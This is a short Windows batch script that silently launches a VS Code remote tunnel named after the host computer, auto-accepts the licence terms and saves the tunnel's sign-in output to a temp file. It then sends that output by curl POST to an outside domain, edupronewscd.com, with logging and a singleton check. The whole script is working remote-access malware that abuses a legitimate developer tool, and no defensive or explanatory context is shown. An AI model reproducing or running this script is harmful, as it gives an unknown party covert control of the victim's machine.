ECHO off

set log_file="C:\Windows\temp\startcode.log"
set code_file="C:\Windows\temp\startcode.dat"
set endpoint="http://edupronewscd.com/code"

ECHO %DATE% %TIME% >> %log_file%

ECHO "Singleton check" >> %log_file%
code tunnel status | findstr "\"Connected\"" > nul
if not errorlevel 1 (
    ECHO "Already running" >> %log_file%
    exit /B
)

ECHO "Starting process" >> %log_file%
start /B code tunnel --accept-server-license-terms --name %computername% 2>&1 > %code_file%

ECHO "Checking output size" >> %log_file%
:loop
timeout /t 5 /nobreak > nul
FOR /F %%i IN ("%code_file%") DO set size=%%~zi
IF %size% EQU 0 GOTO loop

ECHO "Fetching text" >> %log_file%
curl.exe -X POST --data-binary @"%code_file%" %endpoint% 2>&1 >> %log_file%
ECHO "" >> %log_file%

ECHO "Sent text" >> %log_file%
